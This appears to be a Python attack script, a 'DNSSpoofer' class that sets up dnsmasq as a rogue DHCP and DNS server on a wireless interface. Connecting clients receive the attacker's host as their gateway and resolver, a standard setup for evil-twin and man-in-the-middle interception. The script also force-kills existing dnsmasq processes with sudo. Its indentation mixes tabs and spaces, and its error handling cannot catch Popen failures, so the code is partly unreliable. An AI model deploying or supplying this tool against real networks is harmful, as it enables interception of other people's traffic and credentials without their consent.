import subprocess
import os
import time

class DNSSpoofer:
    def __init__(self, interface, local_ip):
        self.interface = interface
        self.local_ip = local_ip
        self.dnsmasq_conf_path = f"/tmp/dnsmasq_{self.interface}.conf"

    def _generate_dnsmasq_conf(self):
    	config_content = f"""
interface={self.interface}
dhcp-range={self.local_ip.rsplit('.', 1)[0]}.10, {self.local_ip.rsplit('.', 1)[0]}.100, 255.255.255.0, 12h
dhcp-option=3,{self.local_ip}
dhcp-option=6,{self.local_ip}
server=8.8.8.8
server=8.8.4.4
no-resolv
"""
    	with open(self.dnsmasq_conf_path, "w") as f:
        	f.write(config_content)
    
    
    def start_dns_spoofing(self):
        print(f"[*] Starting DNS spoofing on interface {self.interface} with local IP {self.local_ip}")
        self._generate_dnsmasq_conf()
        try:
        
            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
     
            self.dnsmasq_process = subprocess.Popen(["sudo", "dnsmasq", "-C", self.dnsmasq_conf_path])
            print("[+] Dnsmasq started successfully.")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Error starting dnsmasq: {e}")
            return False

    def stop_dns_spoofing(self):
        print("[*] Stopping dnsmasq...")
        if hasattr(self, 'dnsmasq_process') and self.dnsmasq_process.poll() is None:
            self.dnsmasq_process.terminate()
            self.dnsmasq_process.wait()
            print("[+] Dnsmasq stopped.")
        else:
            print("[-] Dnsmasq not running or already stopped.")
            
        if os.path.exists(self.dnsmasq_conf_path):
            os.remove(self.dnsmasq_conf_path)

if __name__ == '__main__':

    dns_spoofer = DNSSpoofer(interface="wlan0", local_ip="10.0.0.1")
    dns_spoofer.start_dns_spoofing()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        dns_spoofer.stop_dns_spoofing()


